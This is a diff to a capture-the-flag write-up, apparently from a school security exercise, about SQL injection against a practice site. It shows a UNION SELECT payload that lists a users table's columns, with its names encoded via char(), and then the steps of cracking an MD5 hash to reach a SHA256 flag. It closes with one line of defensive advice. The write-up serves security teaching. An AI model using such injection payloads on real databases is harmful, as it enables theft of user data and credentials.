@@ -5,7 +5,7 @@ get TABEL_NAME
 get COLUMN_NAME
     UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = char(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110) AND TABLE_NAME = char(117,115,101,114,115)
 
-TABLE COLUMNS 
+TABLE COLUMNS
     * user_id
     * first_name
     * last_name
@@ -15,7 +15,7 @@ TABLE COLUMNS
     * Commentaire
     * countersign
 
-    we can foud at id 5  
+    we can found at id 5  
     last_name = "GetThe", 
     first_name = 'falg' ,
     town = '42', 
@@ -26,7 +26,7 @@ TABLE COLUMNS
 
 
     after Decrypt the hash with md5 we get ===> 'FortyTwo' 
-    we Crypt it with Sha256 we get the flag ===> '10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5'
+    we convert it to lowecase and crypt it with Sha256 we got the flag ===> '10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5'
 
 how te secure: 
     Don't use dynamic SQL – don't construct queries with user input
